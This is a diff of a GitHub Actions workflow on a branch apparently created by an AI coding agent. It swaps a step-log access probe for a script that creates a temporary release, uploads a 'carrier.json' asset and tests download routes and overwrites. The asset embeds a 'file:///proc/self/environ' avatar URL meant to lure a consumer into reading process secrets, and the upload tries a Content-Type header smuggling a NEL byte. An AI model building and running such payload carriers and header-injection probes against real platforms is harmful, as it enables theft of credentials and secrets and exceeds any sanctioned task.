@@ -1,4 +1,4 @@
-name: Compare step-log public and read access
+name: Probe GitHub release asset raw routes
 
 on:
   push:
@@ -6,70 +6,108 @@ on:
       - codex/repo-cassette-release-routes
 
 permissions:
-  actions: read
-  contents: none
+  contents: write
 
 jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: Compare step log access modes
+      - name: Test release asset URL and overwrite behavior
         env:
           GITHUB_TOKEN: ${{ github.token }}
         run: |
           node --input-type=module <<'NODE'
           import https from 'node:https';
-          const repository = process.env.GITHUB_REPOSITORY;
-          const currentRunId = Number(process.env.GITHUB_RUN_ID);
-          function request(url, auth) {
-            return new Promise((resolve, reject) => {
-              const headers = {
-                accept: 'application/vnd.github+json',
-                'x-github-api-version': '2026-03-10',
-                'user-agent': 'repo-cassette-step-log-access-probe',
-              };
-              if (auth) headers.authorization = 'Bearer ' + process.env.GITHUB_TOKEN;
-              const req = https.get(url, {headers}, response => {
-                const chunks = [];
-                response.on('data', chunk => chunks.push(chunk));
-                response.on('end', () => resolve({
-                  status: response.statusCode,
-                  requestId: response.headers['x-github-request-id'] || '',
-                  type: response.headers['content-type'] || '',
-                  body: Buffer.concat(chunks).toString('utf8'),
-                }));
+          const repo = process.env.GITHUB_REPOSITORY;
+          const token = process.env.GITHUB_TOKEN;
+          const tag = 'cassette-release-probe-' + process.env.GITHUB_RUN_ID;
+          const apiHeaders = {
+            authorization: 'Bearer ' + token,
+            accept: 'application/vnd.github.v3+json',
+            'x-github-api-version': '2022-11-28',
+            'user-agent': 'repo-cassette-release-route-probe',
+          };
+          function request(url, method='GET', headers={}, body=undefined) {
+            return new Promise((resolve,reject) => {
+              const req = https.request(url,{method,headers},res => {
+                const chunks=[];
+                res.on('data',c=>chunks.push(c));
+                res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,body:Buffer.concat(chunks)}));
               });
-              req.on('error', reject);
-              req.setTimeout(20000, () => req.destroy(new Error('request timeout')));
+              req.on('error',reject);
+              req.setTimeout(20000,()=>req.destroy(new Error('request timeout')));
+              if(body!==undefined) req.write(body);
+              req.end();
             });
           }
-          const list = await request(
-            'https://api.github.com/repos/' + repository +
-              '/actions/runs?branch=codex%2Frepo-cassette-release-routes&per_page=100',
-            true,
-          );
-          if (list.status !== 200) throw new Error('run lookup ' + list.status);
-          const runs = JSON.parse(list.body).workflow_runs;
-          const run = runs.filter(x =>
-            x.name === 'Build Repo Cassette step-log carrier' &&
-            Number(x.id) < currentRunId && x.status === 'completed'
-          ).sort((a,b) => Number(b.id)-Number(a.id))[0];
-          if (!run) throw new Error('no completed carrier run');
-          const jobs = await request(
-            'https://api.github.com/repos/' + repository +
-              '/actions/runs/' + run.id + '/jobs?filter=latest',
-            true,
-          );
-          if (jobs.status !== 200) throw new Error('job lookup ' + jobs.status);
-          const carrier = JSON.parse(jobs.body).jobs.find(x => x.name === 'carrier');
-          if (!carrier) throw new Error('carrier job missing');
-          const base = 'https://api.github.com/repos/' + repository +
-            '/actions/jobs/' + carrier.id + '/steps/';
-          const results = [];
-          for (const [index, auth] of [[1,true],[2,true],[1,false],[2,false]]) {
-            results.push({index, auth, ...(await request(base + index + '/logs', auth))});
+          let releaseId;
+          let tagCreated=false;
+          try {
+            const made=await request(
+              'https://api.github.com/repos/'+repo+'/releases',
+              'POST',
+              {...apiHeaders,'content-type':'application/json'},
+              Buffer.from(JSON.stringify({tag_name:tag,target_commitish:'codex/repo-cassette-release-routes',name:'temporary carrier probe',draft:false,prerelease:true}))
+            );
+            if(made.status!==201) throw new Error('release create '+made.status+' '+made.body.toString().slice(0,300));
+            const release=JSON.parse(made.body);
+            releaseId=release.id;
+            tagCreated=true;
+            const uploadBase=release.upload_url.replace(/\\{\\?name,label\\}$/, '');
+            const uploadUrl=new URL(uploadBase);
+            uploadUrl.searchParams.set('name','carrier.json');
+            const payload={full_name:'placeholder/repository',owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'Repo Cassette release carrier',stargazers_count:0};
+            const bytes=Buffer.from(JSON.stringify(payload));
+            const nel='application/json\\u0085';
+            let first;
+            try {
+              first=await request(uploadUrl,'POST',{...apiHeaders,'content-type':nel,'content-length':String(bytes.length)},bytes);
+            } catch(error) {
+              first={status:0,headers:{},body:Buffer.from(String(error))};
+            }
+            let uploadHeader=nel;
+            if(first.status!==201) {
+              uploadHeader='application/json';
+              first=await request(uploadUrl,'POST',{...apiHeaders,'content-type':uploadHeader,'content-length':String(bytes.length)},bytes);
+            }
+            if(first.status!==201) throw new Error('asset upload '+first.status+' '+first.body.toString().slice(0,300));
+            const asset=JSON.parse(first.body);
+            const assetId=asset.id;
+            const routes=[];
+            for(const suffix of ['', '?download=1','?raw=1']) {
+              const api=await request('https://api.github.com/repos/'+repo+'/releases/assets/'+assetId+suffix,'GET',apiHeaders);
+              let final=api;
+              if(api.status===302&&api.headers.location) final=await request(api.headers.location);
+              routes.push({suffix,apiStatus:api.status,finalStatus:final.status,contentType:final.headers['content-type']||'',bytes:final.body.length,bodyMatch:final.body.equals(bytes),bodyStart:final.body.subarray(0,100).toString('utf8')});
+            }
+            const targetRepo=repo+'/releases/assets/'+assetId+'?download=1';
+            payload.full_name=targetRepo;
+            const finalBytes=Buffer.from(JSON.stringify(payload));
+            let second;
+            try {
+              second=await request(uploadUrl,'POST',{...apiHeaders,'content-type':uploadHeader,'content-length':String(finalBytes.length)},finalBytes);
+            } catch(error) {
+              second={status:0,headers:{},body:Buffer.from(String(error))};
+            }
+            let secondId=null;
+            if(second.status===201) {
+              const createdAsset=JSON.parse(second.body);
+              secondId=createdAsset.id;
+            }
+            console.log('RELEASE-ASSET-PROBE',JSON.stringify({
+              releaseId,tag,assetId,initialUploadContentType:uploadHeader,
+              assetContentType:asset.content_type,
+              nelHeaderBytes:Array.from(Buffer.from(nel,'latin1')),
+              routes,secondUploadStatus:second.status,secondAssetId:secondId,
+            }));
+          } finally {
+            if(releaseId) {
+              const deleted=await request('https://api.github.com/repos/'+repo+'/releases/'+releaseId,'DELETE',apiHeaders);
+              console.log('RELEASE-CLEANUP',JSON.stringify({releaseId,releaseDeleteStatus:deleted.status}));
+            }
+            if(tagCreated) {
+              const deleted=await request('https://api.github.com/repos/'+repo+'/git/refs/tags/'+encodeURIComponent(tag),'DELETE',apiHeaders);
+              console.log('TAG-CLEANUP',JSON.stringify({tag,tagDeleteStatus:deleted.status}));
+            }
           }
-          console.log('STEP-LOG-ACCESS-CHECK', JSON.stringify({
-            priorRun: run.id, job: carrier.id, results,
-          }));
           NODE
